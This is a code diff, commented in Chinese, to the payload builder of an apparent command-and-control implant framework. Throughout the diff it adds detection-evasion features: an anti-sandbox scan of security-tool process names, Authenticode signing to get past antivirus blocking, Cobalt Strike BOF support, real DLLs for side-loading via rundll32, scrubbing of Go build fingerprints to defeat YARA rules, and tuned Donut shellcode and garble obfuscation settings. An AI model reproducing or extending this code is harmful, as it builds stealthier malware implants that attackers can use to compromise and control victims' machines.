@@ -66,6 +66,21 @@ type BuildOptions struct {
 	// 启动随机延迟（秒）：植入端启动后随机休眠 [min,max] 秒，打乱"启动即行为"的检测节奏。
 	StartDelayMin int `json:"startup_delay_min"`
 	StartDelayMax int `json:"startup_delay_max"`
+	// 主动反沙箱进程检测（枚举进程并与安全软件/分析工具进程名比对后延迟执行）。
+	// **默认关闭**：该行为是国产杀软主动防御明确拦截的对抗动作，且需要静态导入
+	// toolhelp32 API + 携带安全软件进程名字符串。开启时服务端加 -tags evasionscan，
+	// 只有勾选才把 gate_scan_windows.go 编进载荷。
+	EvasionScan bool `json:"evasion_scan"`
+	// 构建后代码签名（Authenticode）：请求只能开启，证书配置在服务端 builder.sign_*。
+	SignEnabled bool `json:"sign_enabled"`
+	// BOF 支持（Cobalt Strike Beacon Object File）：**默认关闭**，开启时加 -tags bof。
+	// 关闭时载荷里不含任何 Beacon* 符号/字符串（实测这是 full 档案里唯一剩下的
+	// 高信号明文），需要用 BOF 时再开。
+	BofEnabled bool `json:"bof_enabled"`
+	// DLL 载荷（format=dll）：导出函数名（供 rundll32 调用，空 = Start）与"加载即启动"。
+	// 白加黑场景宿主不一定调用我们的导出函数，所以默认加载即启动（见 dll.go）。
+	DLLExport    string `json:"dll_export"`
+	DLLAutoStart bool   `json:"dll_autostart"`
 }
 
 type BuildResult struct {
@@ -80,6 +95,8 @@ type BuildResult struct {
 	// Evasion metadata
 	XORKey []byte `json:"xor_key,omitempty"`
 	HasXOR bool   `json:"has_xor"`
+	// Sign 代码签名结果（启用签名时才非空）
+	Sign *SignResult `json:"sign,omitempty"`
 }
 
 func New() *Builder {
@@ -333,6 +350,21 @@ func (b *Builder) Build(opts BuildOptions) (*BuildResult, error) {
 		}
 		result.Format = opts.Format
 		result.BuildTime = time.Now()
+		// C 植入端同样是 Windows PE：走同一套可选代码签名（未签名的新 PE 在国产
+		// 安全软件主机上会被拒绝执行，见 sign.go 顶部说明）。
+		if len(result.Binary) > 0 {
+			if signed, signRes, serr := b.signIfNeeded(result.Binary, opts.Format, opts.SignEnabled); serr != nil {
+				return nil, serr
+			} else if signRes != nil {
+				result.Binary = signed
+				result.Sign = signRes
+				if signRes.Signed {
+					logging.Info("builder", "C 植入端代码签名成功（%s）%s", signRes.Method, signerSuffix(signRes.Signer))
+				} else {
+					logging.Warn("builder", "C 植入端产物未签名：%s", signRes.Message)
+				}
+			}
+		}
 		if len(result.Binary) > 0 {
 			hash := sha256.Sum256(result.Binary)
 			result.SHA256 = hex.EncodeToString(hash[:])
@@ -364,6 +396,22 @@ func (b *Builder) Build(opts BuildOptions) (*BuildResult, error) {
 
 	result.Format = opts.Format
 	result.BuildTime = time.Now()
+
+	// 代码签名（Windows PE，可选）：在算 sha256 / 落盘之前签名，保证接口返回的
+	// size 与 sha256 就是"交付字节"的值（签名会改变文件内容与长度）。
+	if len(result.Binary) > 0 {
+		if signed, signRes, serr := b.signIfNeeded(result.Binary, opts.Format, opts.SignEnabled); serr != nil {
+			return nil, serr
+		} else if signRes != nil {
+			result.Binary = signed
+			result.Sign = signRes
+			if signRes.Signed {
+				logging.Info("builder", "代码签名成功（%s）%s", signRes.Method, signerSuffix(signRes.Signer))
+			} else {
+				logging.Warn("builder", "产物未签名：%s", signRes.Message)
+			}
+		}
+	}
 
 	if len(result.Binary) > 0 {
 		hash := sha256.Sum256(result.Binary)
@@ -526,9 +574,19 @@ func (b *Builder) compile(opts BuildOptions) ([]byte, error) {
 		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
 	}
 
-	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile)
+	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile, opts.EvasionScan, opts.BofEnabled)
 	if err != nil {
 		return nil, err
+	}
+
+	// Go 指纹擦除（构建期特征，运行时不需要）：在 UPX 之前做，只做原地置零、长度不变，
+	// 因此 PE 节表/RVA/重定位/UPX 输入布局全部不受影响。擦除对象：
+	//   `\xff Go buildinf:` 魔数、buildinfo 窗口内的 Go 版本串、`Go build ID:` 前缀。
+	// 这些只被 debug.ReadBuildInfo / go tool buildid 读取，运行时（调度器/GC/栈回溯）不用，
+	// 但它们是 Go 家族 YARA 规则最稳定的命中点。
+	if scrubbed, removed := ScrubGoFingerprint(binary); len(removed) > 0 {
+		binary = scrubbed
+		logging.Info("builder", "go fingerprint scrubbed: %s", strings.Join(removed, "；"))
 	}
 
 	// UPX 压缩（仅 Windows exe 且 UPX 可用且开启）
@@ -570,41 +628,20 @@ func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
 		return nil, fmt.Errorf("failed to process templates: %v", err)
 	}
 
-	libFile := filepath.Join(tmpDir, "lib.go")
-	libCode := b.generateLibraryCode(targetOS)
-	if err := os.WriteFile(libFile, []byte(libCode), 0644); err != nil {
+	// 真正的 DLL（c-shared + mingw），见 dll.go：
+	// v1.3.5 及以前这里是普通 go build（CGO_ENABLED=0），`import "C"` 的胶水会被 Go
+	// 静默跳过，产物其实是"改了扩展名的 EXE"（无 IMAGE_FILE_DLL、无导出表），
+	// 白加黑/rundll32 加载器链根本用不了。
+	exportName, err := ValidateDLLExport(opts.DLLExport)
+	if err != nil {
 		return nil, err
 	}
-
-	return b.compileGoCode(tmpDir, targetOS, arch, false, "tcp", "full")
+	return b.compileSharedLibrary(tmpDir, targetOS, arch, opts, exportName, opts.DLLAutoStart)
 }
 
-func (b *Builder) generateLibraryCode(targetOS string) string {
-	if targetOS == "windows" {
-		return `package main
-
-import "C"
-
-//export DllMain
-func DllMain() {
-}
-
-func main() {
-}
-`
-	}
-	return `package main
-
-import "C"
-
-//export Init
-func Init() {
-}
-
-func main() {
-}
-`
-}
+// 说明：旧的 generateLibraryCode（生成 `//export DllMain {}` + 空 main 的假 DLL 胶水）
+// 已删除 —— 它在 CGO_ENABLED=0 下会被 Go 静默跳过，让 `format=dll` 产出"改了扩展名的 EXE"。
+// 现在 DLL 由 dll.go 的 generateDLLGlue 生成（c-shared + 加载即启动 + 可配置导出名）。
 
 func (b *Builder) copyImplantSource(tmpDir, targetOS string) error {
 	return filepath.WalkDir(b.implantDir, func(path string, d fs.DirEntry, err error) error {
@@ -655,6 +692,13 @@ func (b *Builder) copyImplantSource(tmpDir, targetOS string) error {
 func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
 	cfg := config.Get()
 	key := []byte(cfg.Listener.EncryptionKey)
+
+	// 把真正烘焙进载荷的参数写进日志：出现"配了没生效/载荷里怎么有这个特征"时，
+	// 这行是唯一可信的第一现场（前端请求与服务端配置三层，任一层都可能覆盖）。
+	logging.Info("builder",
+		"rendering implant: url=%s interval=%ds jitter=%d%% startup_delay=%d~%ds evasion_scan=%v profile=%s",
+		opts.ServerURL, opts.Interval, opts.Jitter, opts.StartDelayMin, opts.StartDelayMax,
+		opts.EvasionScan, opts.Profile)
 
 	mainFile := filepath.Join(tmpDir, "main.go")
 	data, err := os.ReadFile(mainFile)
@@ -709,16 +753,9 @@ func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
 	return os.WriteFile(mainFile, []byte(content), 0644)
 }
 
-func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string) ([]byte, error) {
-	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
-	// 确保随机 xd 基准与注入值一致。
-
-	// 条件编译标签：
-	//   transport=http       → -tags transport_http（HTTPS 轮询通道，体积较大）
-	//   transport=websocket  → -tags transport_ws（WebSocket 通道）
-	//   transport=mqtt       → -tags transport_mqtt（MQTT pub/sub 通道）
-	//   profile=light        → -tags light（裁剪截图/中继/注入/EDR 等重量级模块）
-	buildTags := ""
+// buildTagList 汇总植入端构建需要的 Go 构建标签（空格分隔，可直接给 -tags）。
+// 单独抽成函数便于单测：标签直接决定哪些代码进入载荷（免杀相关，改错很难察觉）。
+func buildTagList(transport, profile string, evasionScan, bof bool) string {
 	var tags []string
 	switch transport {
 	case "http":
@@ -731,9 +768,26 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 	if profile == "light" {
 		tags = append(tags, "light")
 	}
-	if len(tags) > 0 {
-		buildTags = strings.Join(tags, " ")
+	if evasionScan {
+		tags = append(tags, "evasionscan")
 	}
+	if bof {
+		tags = append(tags, "bof")
+	}
+	return strings.Join(tags, " ")
+}
+
+func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan, bof bool) ([]byte, error) {
+	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
+	// 确保随机 xd 基准与注入值一致。
+	// 条件编译标签（见 buildTagList）：
+	//   transport=http       → transport_http（HTTPS 轮询通道，体积较大）
+	//   transport=websocket  → transport_ws（WebSocket 通道）
+	//   transport=mqtt       → transport_mqtt（MQTT pub/sub 通道）
+	//   profile=light        → light（裁剪截图/中继/注入/EDR 等重量级模块）
+	//   evasion_scan=on      → evasionscan（主动反沙箱进程检测；默认不编译，
+	//                          见 implant/gate_scan_windows.go 的说明）
+	buildTags := buildTagList(transport, profile, evasionScan, bof)
 
 	// TLS 客户端实现文件按通道裁剪：
 	//   - 非 HTTP 构建（TCP）：transport_tls_std.go / transport_tls_utls.go
@@ -794,6 +848,15 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 	}
 	outputPath := filepath.Join(tmpDir, outputName)
 
+	// 把生效的构建档位写进日志：排查"载荷里为什么有这个特征/为什么没生效"时，
+	// 第一现场就是这行（标签决定哪些模块进载荷，例如 evasionscan 默认关闭）。
+	toolchain := goToolchain
+	if toolchain == "" {
+		toolchain = "current"
+	}
+	logging.Info("builder", "compiling implant: os=%s arch=%s tags=%q garble=%v go=%s",
+		targetOS, arch, buildTags, useGarble, toolchain)
+
 	if useGarble {
 		// Garble 混淆编译
 		// 注意: garble flags 必须放在 build 命令之前 (garble -literals build ./pkg)
@@ -804,10 +867,14 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 		if buildTags != "" {
 			garbleArgs = append(garbleArgs, "-tags", buildTags)
 		}
-		// Windows 植入端默认无窗口（-H windowsgui 是 build 的 flag，须放在 build 之后）
+		// ldflags 与标准 go build 保持一致：必须带 -s -w（去符号表与 DWARF）与 -buildid=，
+		// 否则 garble 产物会保留全部调试信息 —— 实测同一载荷 "仅 -H windowsgui" 是 12.29MB，
+		// 补上 -s -w -buildid= 后体积与标准构建同量级，且 pclntab 里的函数名已被 garble 混淆。
+		ldflags := "-s -w -buildid="
 		if targetOS == "windows" && os.Getenv("TOSHELL_CONSOLE") == "" {
-			garbleArgs = append(garbleArgs, "-ldflags", "-H windowsgui")
+			ldflags += " -H windowsgui"
 		}
+		garbleArgs = append(garbleArgs, "-ldflags", ldflags)
 		garbleArgs = append(garbleArgs, "-o", outputPath, ".")
 		buildCmd := exec.Command("garble", garbleArgs...)
 		buildCmd.Dir = tmpDir
@@ -1209,12 +1276,12 @@ func (b *Builder) generateShellcodeWithDonut(binary []byte, arch, params string)
 		// Thread=1：把 EXE 入口点作为**独立线程**运行，植入体主线程不受影响；
 		// ExitOpt=1（退出线程）而非 2（退出宿主进程）——旧配置 Thread=0 + ExitOpt=2
 		// 会在内存执行的程序结束时调用 RtlExitUserProcess 把植入体一起干掉。
-		Thread:    1,
-		Compress:  1,
-		Unicode:   0,
-		ExitOpt:   1,
-		Format:    1,
-		Bypass:    3,
+		Thread:     1,
+		Compress:   1,
+		Unicode:    0,
+		ExitOpt:    1,
+		Format:     1,
+		Bypass:     3,
 		Parameters: params,
 	}
 
